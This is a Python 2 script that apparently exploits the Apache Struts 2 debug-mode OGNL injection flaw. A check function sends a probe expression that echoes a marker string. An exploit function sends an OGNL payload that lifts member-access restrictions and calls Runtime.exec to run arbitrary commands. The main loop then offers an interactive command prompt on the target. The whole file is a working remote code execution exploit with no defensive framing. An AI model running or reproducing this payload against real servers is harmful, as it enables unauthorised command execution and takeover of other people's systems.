import requests
import sys



def check(uri):
    test_post = {
    'debug':'command',
    'expression':'(#wr=#context[#parameters.obj[0]].getWriter())!=(#wr.println(#parameters.content[0]))!=(#wr.flush())!=(#wr.close())',
    'obj':'com.opensymphony.xwork2.dispatcher.HttpServletResponse',
    'content':'Adlabgsrc'
    }



    r = requests.post(url=uri,data=test_post)
    response  = r.text
    return ('true' in response or 'Adlabgsrc' in response or 'null' in response) and len(response) < 20

def exploit(uri, cmd):
    post_data = {
        'debug':'browser',
        'object':'(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#context[#parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.command[0]).getInputStream()))):xx.toString.json',
        'rpsobj':'com.opensymphony.xwork2.dispatcher.HttpServletResponse',
        'content':'110',
        'command':cmd
    }
    return requests.post(url=uri, data=post_data).text




if __name__ == "__main__":
    uri = sys.argv[1]

    if(check(uri)):
        print "Run command"
        while(True):
            cmd = raw_input("$")
            if(cmd == 'exit'):
                break
            else:
                try:
                    print exploit(uri,cmd)
                except:
                    print "there is some encoding error, but the command is executed."
    else:
        print "This URL is not exploitable."